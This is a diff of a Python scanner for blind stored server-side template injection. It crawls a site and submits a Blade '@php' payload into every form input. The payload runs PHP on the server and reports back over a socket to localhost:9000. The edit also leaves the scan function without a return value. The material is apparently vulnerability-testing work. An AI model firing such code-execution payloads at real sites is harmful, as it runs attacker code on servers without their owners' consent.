@@ -4,6 +4,7 @@ import requests
 import random
 import string
 import subprocess
+import pickle
 
 # Generate a random string to uniquely identify every instance of Stored Posterior SSTI generated from this script
 random_string = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=10))
@@ -171,7 +172,8 @@ def test_blind_posterior(urls):
                     post_data[inp] = f"""@php $sock = fsockopen('localhost', 9000);
                                               $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
                                               $url = $protocol . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; 
-                                              fwrite($sock, 'Injection detected from form {group}, on page: {url}. Code was executed on '. $url); @endphp"""
+                                              fwrite($sock, 'Injection detected from form {group}, on page: {url}. Code was executed on '. $url); 
+                                              fclose($sock) @endphp"""
                 post_data["_token"] = token  # Add token last
                 requests.post(group, post_data, cookies=cookies)
 
@@ -179,21 +181,25 @@ def test_blind_posterior(urls):
             scan_result.append("URL: " + url + " isVulnerable: Unable to test, no input points found")
             continue
 
-    while True:
-        server_instance = subprocess.Popen(['python', 'SocketServer.py'])
-        server_instance.wait()
+    #while True:
+    server_instance = subprocess.Popen(['python', 'SocketServer.py', ' '.join(urls)])
+    while server_instance.poll() is None:
+        pass
+    #server_instance.wait()
+    #stdout, stderr = server_instance.communicate()
 
-    print("here somehow")
-    return scan_result
+        # server_response = stdout.strip()
+        # if(server_response == "stop"):
+        #     break
 
 # Begin the scanning process
-# html = begin_scan()
-#
-# urls = get_page_urls(html)
-#
-# nested_links = check_nested_links(urls)
-# filtered_urls = filter_links(urls+nested_links)
-stored_imm_results = test_blind_posterior(["http://127.0.0.1:8000/blindpos"])
+html = begin_scan()
 
-for result in stored_imm_results:  # print results
-    print(result)
+urls = get_page_urls(html)
+
+nested_links = check_nested_links(urls)
+filtered_urls = filter_links(urls+nested_links)
+stored_imm_results = test_blind_posterior(filtered_urls)
+
+# for result in stored_imm_results:  # print results
+#     print(result)
